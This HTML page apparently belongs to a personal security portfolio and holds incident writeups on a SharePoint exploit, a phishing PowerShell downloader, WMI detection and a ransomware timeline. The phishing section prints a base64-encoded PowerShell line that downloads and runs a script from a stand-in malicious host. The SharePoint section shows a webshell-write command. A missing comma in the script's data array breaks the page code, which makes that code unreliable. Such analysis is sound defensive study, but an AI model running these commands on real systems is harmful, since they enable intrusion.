<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Security Writeups - Swetha Devi</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
  
  <style>
    :root{
      --bg:#0a0e27; 
      --card:#14182e; 
      --muted:#8b95a5; 
      --accent:#00d9ff; 
      --accent-2:#00a896;
      --text:#e8eef6;
      --border:rgba(255,255,255,0.06);
    }
    
    *{box-sizing:border-box; margin:0; padding:0}
    
    body{
      font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background:var(--bg);
      color:var(--text);
      line-height:1.7;
      -webkit-font-smoothing:antialiased;
      padding: 20px;
    }
    
    .container{
      max-width:1000px;
      margin:0 auto;
    }
    
    .back-link{
      display:inline-flex;
      align-items:center;
      gap:8px;
      color:var(--accent);
      text-decoration:none;
      margin-bottom:40px;
      padding:10px 0;
    }
    
    .writeup-header{
      margin-bottom:40px;
    }
    
    .writeup-header h1{
      font-size:36px;
      margin-bottom:16px;
    }
    
    .writeup-meta{
      color:var(--muted);
      font-size:15px;
      display:flex;
      gap:20px;
      margin-bottom:20px;
    }
    
    .writeup-tags{
      display:flex;
      gap:10px;
      flex-wrap:wrap;
    }
    
    .tag{
      background:rgba(0,217,255,0.1);
      border:1px solid rgba(0,217,255,0.2);
      padding:6px 12px;
      border-radius:20px;
      font-size:13px;
      color:var(--accent);
    }
    
    .writeup-content{
      background:var(--card);
      border:1px solid var(--border);
      border-radius:16px;
      padding:40px;
      margin-bottom:60px;
    }
    
    .writeup-content h2{
      color:var(--accent);
      margin:30px 0 15px;
      font-size:24px;
    }
    
    .writeup-content h3{
      color:var(--text);
      margin:25px 0 12px;
      font-size:20px;
    }
    
    .writeup-content p{
      margin-bottom:16px;
      color:var(--muted);
    }
    
    .writeup-content ul, .writeup-content ol{
      margin:16px 0 16px 20px;
      color:var(--muted);
    }
    
    .code-block{
      margin:20px 0;
      background:rgba(0,0,0,0.3);
      border-radius:12px;
      overflow:hidden;
      border:1px solid var(--border);
    }
    
    .code-header{
      padding:12px 20px;
      background:rgba(0,0,0,0.4);
      border-bottom:1px solid var(--border);
      font-size:14px;
      color:var(--muted);
    }
    
    pre{
      margin:0;
      padding:20px;
      overflow-x:auto;
    }
    
    .ioc-box{
      background:rgba(255,0,0,0.05);
      border:1px solid rgba(255,0,0,0.2);
      border-radius:8px;
      padding:20px;
      margin:20px 0;
    }
    
    .ioc-box h4{
      color:#ff6b6b;
      margin-bottom:10px;
    }
    
    @media (max-width: 768px){
      .writeup-header h1{
        font-size:28px;
      }
      .writeup-content{
        padding:24px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <a href="index.html" class="back-link">
      <i class="fas fa-arrow-left"></i> Back to Home
    </a>
    
    <!-- Individual Writeups will be loaded here -->
    <div id="writeups-list"></div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
  <script>
    // Writeups Data
    const writeupsData = [
      {
       "id": "soc342-sharepoint-toolshell-rce",
       "title": "Alert: CVE-2025-53770 SharePoint ToolShell Auth Bypass & RCE",
       "date": "Jul 22, 2025",
       "readTime": "7 min read",
       "platform": "Proxy + Endpoint (EDR)",
       "alertId": "SOC342",
       "investigationDate": "2025-07-22 13:07",
       "difficulty": "Hard",
       "verdict": "True Positive",
       "tags": ["rce", "webshell", "sharepoint", "zero-day", "incident-response", "powershell", "malware"],
       "content": `
    <!-- EXECUTIVE SUMMARY -->
         <h2>Executive Summary</h2>
         <div class="ioc-box">
           <h4>Quick Facts</h4>
           <p><strong>Alert ID:</strong> SOC342</p>
           <p><strong>Platform:</strong> Proxy + Endpoint Security</p>
           <p><strong>Investigation Date:</strong> 2025-07-22 13:07</p>
           <p><strong>Difficulty:</strong> Hard</p>
           <p><strong>Verdict:</strong> <span style="color: #ff6b6b">True Positive</span></p>
         </div>
    
         <p><strong>TL;DR:</strong> SharePoint was attacked using a zero-day auth bypass + RCE exploit. The attacker executed encoded PowerShell via w3wp.exe, compiled a malicious payload using csc.exe, and deployed an ASPX webshell for persistence. MachineKey was accessed — authentication tokens may be compromised.</p>
    
    <!-- FINDINGS -->
         <h2>Key Findings</h2>
         <ul>
           <li><strong>Unauthenticated exploit delivered:</strong> Suspicious POST request targeting ToolPane.aspx with large payload</li>
           <li><strong>Code execution achieved:</strong> w3wp.exe spawned PowerShell with encoded commands</li>
           <li><strong>Persistence established:</strong> Webshell saved to SharePoint Layouts directory</li>
         </ul>
    
    <!-- RECOMMENDED ACTIONS -->
         <h2>Recommended Actions</h2>
         <div class="ioc-box">
           <h4>Immediate Actions</h4>
           <ul>
             <li>Isolate SharePoint01 from network</li>
             <li>Remove webshell: TEMPLATE/LAYOUTS/spinstall0.aspx</li>
             <li>Block attacker IP: 107.191.58.76</li>
           </ul>
         </div>
    
         <div class="ioc-box">
           <h4>Long-term Recommendations</h4>
           <ul>
             <li>Patch SharePoint for CVE-2025-53770 once released</li>
             <li>Reset MachineKey + rotate privileged credentials</li>
             <li>Hunt for related lateral movement attempts</li>
           </ul>
         </div>
    
    <!-- INVESTIGATION PROCESS -->
         <h2>Investigation Process</h2>
         <h3>Alert Triage</h3>
         <ul>
           <li>Alert flagged a critical SharePoint vulnerability exploitation attempt</li>
           <li>Large payload + spoofed referer indicated malicious intent</li>
           <li>External IP interacting with internal server on port 443</li>
         </ul>
    
         <h3>Data Collection</h3>
         <ul>
           <li>Proxy logs (HTTP request with suspicious parameters)</li>
           <li>Endpoint telemetry (process creation chain)</li>
         </ul>
    
    <!-- TECHNICAL ANALYSIS -->
          <h2>Technical Analysis</h2>
          <h3>Event Correlation</h3>
          <p>Exploit → RCE → Payload compile → Webshell drop → MachineKey access.</p>
    
          <div class="code-block">
            <div class="code-header">Suspicious Initial Request</div>
            <pre><code class="language-http">POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx 
     Source: 107.191.58.76 
     Content-Length: 7699
     Referer: /_layouts/SignOut.aspx</code></pre>
         </div>
    
         <h3>Malware / Payload Behavior</h3>
         <p>PowerShell executed encoded script to load assemblies and extract MachineKey.</p>
    
         <div class="code-block">
           <div class="code-header">Webshell Write Command</div>
           <pre><code class="language-cmd">cmd.exe /c echo <WebShell> > 
     "C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx"</code></pre>
         </div>
    
    <!-- MITRE ATT&CK MAPPING -->
         <h2>MITRE ATT&CK Mapping</h2>
         <div class="ioc-box">
            <table style="width:100%; border-collapse: collapse;">
              <tr><th>Tactic</th><th>Technique ID</th><th>Name</th><th>Evidence</th></tr>
              <tr><td>Initial Access</td><td>T1190</td><td>Exploit Public-Facing App</td><td>ToolPane.aspx exploit</td></tr>
              <tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td><td>EncodedCommand execution</td></tr>
              <tr><td>Persistence</td><td>T1505.003</td><td>Web Shell</td><td>spinstall0.aspx</td></tr>
              <tr><td>Credential Access</td><td>T1552</td><td>Credential/Config Access</td><td>MachineKey extraction</td></tr>
            </table>
         </div>
    
    <!-- CYBER KILL CHAIN ALIGNMENT -->
         <h2>Cyber Kill Chain Alignment</h2>
         <ol>
            <li><strong>Exploitation:</strong> Zero-day RCE via ToolPane.aspx</li>
            <li><strong>Installation:</strong> Webshell deployed</li>
            <li><strong>Command & Control:</strong> Webshell allows continuous access</li>
            <li><strong>Actions on Objectives:</strong> Access to encryption keys</li>
         </ol>
    
    <!-- TIMELINE ANALYSIS -->
         <h2>Timeline Analysis</h2>
         <div class="ioc-box">
            <h4>Attack Timeline</h4>
            <p><strong>13:07:00:</strong> Malicious POST request</p>
            <p><strong>13:07:11:</strong> PowerShell executed via w3wp.exe</p>
            <p><strong>13:07:27:</strong> Payload compiled (csc.exe)</p>
            <p><strong>13:07:29:</strong> Webshell dropped in SharePoint directory</p>
            <p><strong>13:07:34:</strong> MachineKey extracted</p>
         </div>
    
    <!-- IOCS -->
         <h2>Indicators of Compromise (IOCs)</h2>
         <div class="ioc-box">
             <h4>Network IOCs</h4>
             <p>• 107.191.58.76 (Attacker)</p>
         </div>
    
         <div class="ioc-box">
             <h4>File IOCs</h4>
             <p>• spinstall0.aspx (Webshell)</p>
             <p>• C:\\Windows\\Temp\\payload.exe</p>
         </div>
    
         <div class="ioc-box">
            <h4>Behavioral IOCs</h4>
            <p>• w3wp.exe → powershell.exe</p>
            <p>• powershell.exe → csc.exe</p>
         </div>
    
    <!-- IMMEDIATE ACTIONS -->
         <h2>Immediate Actions Taken</h2>
         <ol>
            <li>Alert escalated to IR</li>
            <li>Webshell identified and documented</li>
         </ol>
    
    <!-- LESSONS LEARNED -->
         <h2>What I Learned From This Investigation</h2>
         <ul>
            <li>Understanding web exploit → PowerShell execution chain</li>
            <li>SharePoint exploitation can lead to full server compromise quickly</li>
            <li>Importance of monitoring w3wp.exe child processes</li>
         </ul>
    
    <!-- REAL-WORLD SCENARIO -->
        <h2>Real-World Scenario Considerations</h2>
         <div class="ioc-box">
            <h4>⚠️ Lab Limitations</h4>
            <p>Full disk + memory forensics and SQL server log review needed for real IR.</p>
         </div>
    
         <!-- CONCLUSION -->
         <h2>Conclusion</h2>
         <p>This was a successful and severe breach. The attacker achieved persistent RCE on a critical internal SharePoint server. Immediate isolation, patching, and credential rotation are required to contain impact.</p>
       `
      }

      {
        id: "phishing-powershell",
        title: "Phishing Campaign Analysis: PowerShell Downloader",
        date: "Jan 15, 2024",
        readTime: "8 min read",
        tags: ["phishing", "powershell", "c2", "download", "analysis"],
        content: `
          <h2>Overview</h2>
          <p>Analysis of a sophisticated phishing campaign using PowerShell downloaders to establish command and control infrastructure.</p>
          
          <h2>Attack Chain</h2>
          <ol>
            <li>Phishing email with malicious Word document attachment</li>
            <li>Macro execution triggering PowerShell script</li>
            <li>Base64 encoded downloader execution</li>
            <li>C2 communication establishment</li>
            <li>Secondary payload delivery and execution</li>
          </ol>
          
          <h2>PowerShell Analysis</h2>
          <p>The malicious PowerShell script uses multiple obfuscation techniques:</p>
          
          <div class="code-block">
            <div class="code-header">powershell</div>
            <pre><code class="language-powershell"># Base64 encoded PowerShell downloader
$enc = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBkAG8AbQBhAGkAbgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
Invoke-Expression $dec</code></pre>
          </div>
          
          <h2>Indicators of Compromise (IOCs)</h2>
          <div class="ioc-box">
            <h4>Network IOCs</h4>
            <p>• malicious-domain.com</p>
            <p>• 192.168.1.100</p>
            <p>• hxxp://evil[.]com/payload.exe</p>
          </div>
          
          <div class="ioc-box">
            <h4>File Hashes</h4>
            <p>• MD5: a1b2c3d4e5f678901234567890123456</p>
            <p>• SHA256: abc123def45678901234567890abcdef1234567890abcdef1234567890abcd</p>
          </div>
          
          <h2>Detection Recommendations</h2>
          <p>Create detection rules for:</p>
          <ul>
            <li>Base64 encoded PowerShell execution</li>
            <li>Suspicious network connections from PowerShell processes</li>
            <li>Unusual process chains involving Office applications and PowerShell</li>
            <li>Large Base64 strings in command line arguments</li>
          </ul>
        `
      },
      {
        id: "wmi-lateral",
        title: "WMI Abuse for Lateral Movement Detection",
        date: "Jan 16, 2024",
        readTime: "6 min read",
        tags: ["lateral", "wmi", "detection", "windows", "movement"],
        content: `
          <h2>Introduction</h2>
          <p>Windows Management Instrumentation (WMI) is frequently abused by attackers for lateral movement.</p>
          
          <h2>Detection Rule Example</h2>
          <div class="code-block">
            <div class="code-header">yaml</div>
            <pre><code class="language-yaml">title: Suspicious WMI Execution
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detects suspicious WMI process creation
author: Swetha Devi
date: 2024/01/16
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\\WmiPrvSE.exe'
        Image|endswith: '\\cmd.exe'
    condition: selection
level: high
tags:
    - attack.lateral_movement
    - attack.t1047</code></pre>
          </div>
          
          <h2>Investigation Steps</h2>
          <ol>
            <li>Check Windows Event Logs: WMI-Activity/Operational</li>
            <li>Review process creation events from WmiPrvSE.exe</li>
            <li>Analyze network connections from compromised systems</li>
          </ol>
        `
      },
      {
        id: "ransomware-analysis",
        title: "Ransomware Infection Chain Analysis",
        date: "Feb 20, 2024",
        readTime: "10 min read",
        tags: ["ransomware", "encryption", "analysis", "recovery", "incident-response"],
        content: `
          <h2>Executive Summary</h2>
          <p>Detailed analysis of a ransomware attack affecting multiple systems.</p>
          
          <h2>Infection Timeline</h2>
          <p><strong>Day 1:</strong> Initial access via RDP brute force</p>
          <p><strong>Day 2:</strong> Discovery phase using built-in Windows tools</p>
          <p><strong>Day 3:</strong> Lateral movement via PsExec and WMI</p>
          <p><strong>Day 4:</strong> Ransomware deployment across network</p>
          
          <h2>Technical Analysis</h2>
          <p>The ransomware exhibits these characteristics:</p>
          <ul>
            <li>Disables Windows Defender and security software</li>
            <li>Deletes volume shadow copies using vssadmin.exe</li>
            <li>Encrypts files with .locked extension</li>
            <li>Drops ransom note in each directory</li>
          </ul>
        `
      }
    ];

    // Function to display all writeups
    function displayAllWriteups() {
      const container = document.getElementById('writeups-list');
      
      if (!container) return;
      
      writeupsData.forEach(writeup => {
        const writeupElement = document.createElement('article');
        writeupElement.className = 'writeup';
        writeupElement.id = writeup.id;
        
        writeupElement.innerHTML = `
          <div class="writeup-header">
            <h1>${writeup.title}</h1>
            <div class="writeup-meta">
              <span class="date">${writeup.date} • ${writeup.readTime}</span>
            </div>
            <div class="writeup-tags">
              ${writeup.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
            </div>
          </div>
          
          <div class="writeup-content">
            ${writeup.content}
          </div>
        `;
        
        container.appendChild(writeupElement);
      });
      
      // Apply syntax highlighting
      if (window.Prism) {
        Prism.highlightAll();
      }
    }

    // Display writeups when page loads
    if (document.getElementById('writeups-list')) {
      displayAllWriteups();
    }
  </script>
</body>
</html>
